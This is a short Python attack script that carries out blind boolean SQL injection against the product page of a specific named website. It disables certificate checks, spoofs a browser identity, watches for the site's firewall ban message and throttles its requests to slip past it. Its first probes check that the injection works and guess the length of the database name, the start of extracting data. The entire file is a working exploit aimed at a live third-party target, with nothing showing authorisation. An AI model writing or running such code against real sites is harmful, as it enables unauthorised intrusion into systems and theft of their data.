#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re, time, sys
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=15, context=ctx)
        b = r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(80000).decode('utf-8','ignore')
    except Exception:
        return 'ERR'
    if '云网盾' in b or '疑似攻击' in b:
        return 'BAN'
    if 'Invalid SQL' in b:
        return 'ERR'
    return 'TRUE' if TRUE_MARK in b else 'FALSE'

def test(cond):
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(2)
    return r

print('通道1=1:', test('1=1'), flush=True)
print('length(database())=9:', test('length(database())=9'), flush=True)
print('length(schema())=9:', test('length(schema())=9'), flush=True)
